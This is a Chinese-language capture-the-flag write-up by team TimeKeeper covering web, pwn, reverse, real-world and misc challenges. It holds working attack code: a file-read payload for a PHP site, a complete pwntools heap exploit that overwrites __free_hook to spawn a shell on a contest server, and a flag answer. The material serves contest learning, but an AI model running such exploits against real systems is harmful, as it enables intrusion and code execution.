# TimeKeeper-XCTF-Second-WriteUp

## WEB

### 签到题

关注公众号

### babyphp

打开是一个端口扫描系统，随手一测发现有flag.php，点击scan后发现

```
Port scan is deperacted and try to find the source code! // Google is your best friend
```

直接去github上搜索，发现该系统源码。

https://github.com/search?l=PHP&q=%3Cinput+type%3D%22text%22+name%3D%22port%22+value%3D%2280%2C8080%2C8888%2C1433%2C3306%22%3E&type=Code

虽然题目环境port scan功能已经没了，但是还有一个

```php
if($url != null){ 

    $host = getHost($url); 
    echo getCss($host,getHtmlContext($url)); 
}
```

的功能。

通过

```php
$csshtml = "<style>".file_get_contents($cssurl)."</style>"; 
```

去读flag.php

所以自己vps上放一个内容为

```html
<link href='./.css/../../flag.php'>
```

的文件。

![rcg95q.png](https://s3.ax1x.com/2020/12/24/rcg95q.png)

## PWN

### honorbook

```PYTHON
from pwn import *

p = remote("121.36.192.114","9999") 
libc = ELF('./libs/lib/libc-2.27.so')
scanf = libc.sym['scanf']
libc.address = 0x00000040009f65bc-scanf-0x1f000
success(hex(libc.address))
def add(idx,name,msg):
    p.sendlineafter("Code:","1")
    p.sendlineafter("ID:",str(idx))
    p.sendlineafter("User name: ",name)
    p.sendafter("Msg: ",msg)

def show(idx):
    p.sendlineafter("Code:","3")
    p.sendlineafter("ID:",str(idx))

def free(idx):
    p.sendlineafter("Code:","2")
    p.sendlineafter("ID:",str(idx))

def edit(idx,msg):
    p.sendlineafter("Code:","4")
    p.sendlineafter("Index:",str(idx))
    p.sendafter("Msg: ",msg)

add(0,'1','1\n')
add(1,'2','2\n')
add(2,p64(0x21)*2,(p64(0x21)*2)*0xe+'\n')
add(3,p64(0x21)*2,(p64(0x21)*2)*0xe+'\n')
free(0)
add(0,'1','A'*0xe8+'\xf1')
free(2)
free(1)
free_hook = libc.sym['__free_hook']
success(hex(free_hook))
system = libc.sym['system']
add(4,'3','/bin/sh'.ljust(0x20,'\x00')+p64(0)+p64(0xf1)+p64(free_hook)*3+'\n')
add(5,'/bin/sh\x00','/bin/sh\x00\n')
add(6,'123','123\n')
edit(6,p64(system)+'\n')
free(5)

p.interactive()
```



## REVERSE

### mips

走迷宫就可以了



### pypy

[![r6j4PK.md.jpg](https://s3.ax1x.com/2020/12/23/r6j4PK.md.jpg)](https://imgchr.com/i/r6j4PK)

这里打印就可以看到反编译的源码了



```python
DEFAULT_KEY = 'Yó\x02Ã%\x9a\x820\x0b»%\x7f~;ÒÜ'

def rc4(O0O0O0000O0OOOO0O, key=DEFAULT_KEY, skip=1024):
    O00OOOOOOO00OO00O = 0
    OO0OOOO0000OO00OO = bytearray([OO00OOOO0OOOOO00O for OO00OOOO0OOOOO00O in range(256)])
    O00OOOOOOO00OO00O = 0
    for OOOO000OOO00O000O in range(256):
        O00OOOOOOO00OO00O = (O00OOOOOOO00OO00O + OO0OOOO0000OO00OO[OOOO000OOO00O000O] + ord(key[(OOOO000OOO00O000O % len(key))])) % 256
        OO000O0O0OOOOO0OO = OO0OOOO0000OO00OO[OOOO000OOO00O000O]
        O000O0OO00O00000O = OO0OOOO0000OO00OO[O00OOOOOOO00OO00O]
        OO0OOOO0000OO00OO[OOOO000OOO00O000O] = OO0OOOO0000OO00OO[O00OOOOOOO00OO00O]
        OO0OOOO0000OO00OO[O00OOOOOOO00OO00O] = OO000O0O0OOOOO0OO
    else:
        O00OOOOOOO00OO00O = 0
        O0O0OO0OO00OOOOO0 = 0
        OO0OOO000000OO0O0 = []
        if skip > 0:
            for OOOO000OOO00O000O in range(skip):
                O00OOOOOOO00OO00O = (O00OOOOOOO00OO00O + 1) % 256
                O0O0OO0OO00OOOOO0 = (O0O0OO0OO00OOOOO0 + OO0OOOO0000OO00OO[O00OOOOOOO00OO00O]) % 256
                OO0OOOO0000OO00OO[O00OOOOOOO00OO00O], OO0OOOO0000OO00OO[O0O0OO0OO00OOOOO0] = OO0OOOO0000OO00OO[O0O0OO0OO00OOOOO0], OO0OOOO0000OO00OO[O00OOOOOOO00OO00O]

        for O0000O0OOO000OO0O in O0O0O0000O0OOOO0O:
            O00OOOOOOO00OO00O = (O00OOOOOOO00OO00O + 1) % 256
            O0O0OO0OO00OOOOO0 = (O0O0OO0OO00OOOOO0 + OO0OOOO0000OO00OO[O00OOOOOOO00OO00O]) % 256
            OO0OOOO0000OO00OO[O00OOOOOOO00OO00O], OO0OOOO0000OO00OO[O0O0OO0OO00OOOOO0] = OO0OOOO0000OO00OO[O0O0OO0OO00OOOOO0], OO0OOOO0000OO00OO[O00OOOOOOO00OO00O]
            O0O0OOOO0OOOOO0OO = OO0OOOO0000OO00OO[((OO0OOOO0000OO00OO[O00OOOOOOO00OO00O] + OO0OOOO0000OO00OO[O0O0OO0OO00OOOOO0]) % 256)]
            OO0OOO000000OO0O0.append(chr(ord(O0000O0OOO000OO0O) ^ O0O0OOOO0OOOOO0OO))
        else:
            return ''.join(OO0OOO000000OO0O0)


def func(O0O0O0OO00O00OOO0):
    O000OOOO0O00OO000 = rc4(O0O0O0OO00O00OOO0)
    if O000OOOO0O00OO000.encode('utf-8').hex() == '275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0':
        return 'YOU WIN'
    return 'YOU LOSE'
print( rc4(bytes.fromhex( '275b39c381c28b701ac3972338456022c2ba06c3b04f5501471c47c38ac380c29b72c3b5c38a7ec2a5c2a0').decode('utf-8')))
```



## REAL WORLD
### aes_baby

```python
import re
import os
import fuckpy3
import string
import hashlib
import itertools
import base64
from pwn import *
chartable = string.digits+string.ascii_letters
filename = 'sha2'
os.system('rm %s'%filename)
os.system('wget http://192.168.214.93:8000/%s'%filename)
payload = base64.b64encode(open(filename,'rb').read())
p = remote('139.159.190.149',10002)
def proof(prefix):
    for t in itertools.permutations(chartable,5):
        # print(prefix+''.join(t))
        tmd5 = hashlib.md5((prefix+''.join(t)).encode()).digest()
        if tmd5.startswith(b'\x00\x00\x00') and tmd5[3]&0xf0==0:
            return ''.join(t)
    return ''
line = p.recvuntil('.startswith').decode()
prefix = re.findall(r'md5(\((.+?)\+xxxx)',line)[0][1]
# print(prefix)

p.recv()
p.sendline(proof(prefix))




p.sendlineafter('Encode your executable using base64:',payload)
p.interactive()
```



```C
#include <stdio.h>
#include <string.h>
#include "aes.h"
char tabs[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
void tohex(char *hex, char *buf, int len)
{
	for (size_t i = 0; i < len; i += 2)
	{
		char t = hex[i];
		if (t > '9' && t <= 'f')
		{
			t = t - 'a' + 0xa;
		}
		else
		{
			t = t - '0';
		}

		buf[i / 2] = t << 4;
		t = hex[i + 1];
		if (t > '9' && t <= 'f')
		{
			t = t - 'a' + 0xa;
		}
		else
		{
			t = t - '0';
		}
		buf[i / 2] |= t;
	}
}
int main()
{

	uint8_t i;
	char test[500] = {};
	char key[16] = {};
	char enc[80] = {};

	// memcpy(&key[12],"aDuk",4);
	scanf("%s", test);
	// for (size_t i = 0; test[i]; i++)
	// {
	// 	if(test[i]=='\n'){
	// 		test[i]  = 0;
	// 	}
	// }
	memcpy(key, test, 12);
	// printf("load succ");
	tohex(&test[12], enc, strlen(&test[12]));
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	uint8_t *w; // expanded key
	w = aes_init(16);
	for (size_t c1 = 0; c1 < 62; c1++)
	{
		// printf("%d\n",c1);
		for (size_t c2 = 0; c2 < 62; c2++)
		{
			for (size_t c3 = 0; c3 < 62; c3++)
			{
				for (size_t c4 = 0; c4 < 62; c4++)
				{
					key[12] = tabs[c1];
					key[13] = tabs[c2];
					key[14] = tabs[c3];
					key[15] = tabs[c4];
					// printf("%s",key);
					uint8_t in[500] = {};

					aes_key_expansion(key, w);
					aes_inv_cipher(enc, in, w);
					if (!strcmp(in, "KUNPENG_HPC_AES!"))
					{
						key[16] = 0;
						printf("%s", &key[12]);
						return 0;
					}
				}
			}
		}
	}

	// printf("\n");

	return 0;
}

```

## Misc 

### S34HUNKA

下载本题附件，得到一个Excel表格，打开发现是一幅像素画，随意取几个单元格观察，发现是通过设置单元格格式中背景颜色的方式将每个点绘制出来的。将其转为csv格式，确认表格中没有数据。

<img src="https://i.loli.net/2020/12/23/HS9VGuIO5zisP3T.png" alt="e.png" style="zoom: 25%;" />

查看表格属性，看到两个字段，标题：“噴火”，作者：“堀内辰男”，上网使用这几个关键词进行搜索，得知这位作者确实在使用Excel绘画方面有些成就。在[他的网站](http://www2.odn.ne.jp/~cbl97790/)上的[新作展示室II](http://www2.odn.ne.jp/~cbl97790/shinsakutenjishitu2.htm)页面，找到了该作品的缩略图，打开查看，发现其分辨率较低，查看分辨率为219×220，和Excel中图片一致，遂保存以备后用。

之后，设法从Excel表格中读取每个单元格的背景颜色，每个单元格对应一个像素点， 绘制为一张真正的图片。编写脚本如下：

```python
from openpyxl import load_workbook
from PIL import Image, ImageDraw, ImageColor

wb = load_workbook(filename='s34hunka.xlsx', read_only=True)
ws = wb.active

im = Image.new("RGB", (ws.max_row, ws.max_column), "white")
draw = ImageDraw.Draw(im)

data = tuple(ws)
for row in range(0, ws.max_row):
    for col in range(0, ws.max_column):
        clid = data[row][col].fill.start_color.index
        draw.point((row, col), ImageColor.getrgb("#"+clid[2:8]))

im = im.transpose(Image.ROTATE_270)
im = im.transpose(Image.FLIP_LEFT_RIGHT)
im.save("test.bmp")
```

这样即可将图片从Excel表格中导出。

使用Stegsolve打开两张图片，使用SImage Combiner功能比较两张图片，在两图片对应坐标相减得到的结果中得到flag。

<img src="https://i.loli.net/2020/12/23/teaWPRNhxKrlVH4.png" alt="f.png" style="zoom:80%;" />

`flag{Let'5_P41nt_wI7h_eXcEl}`

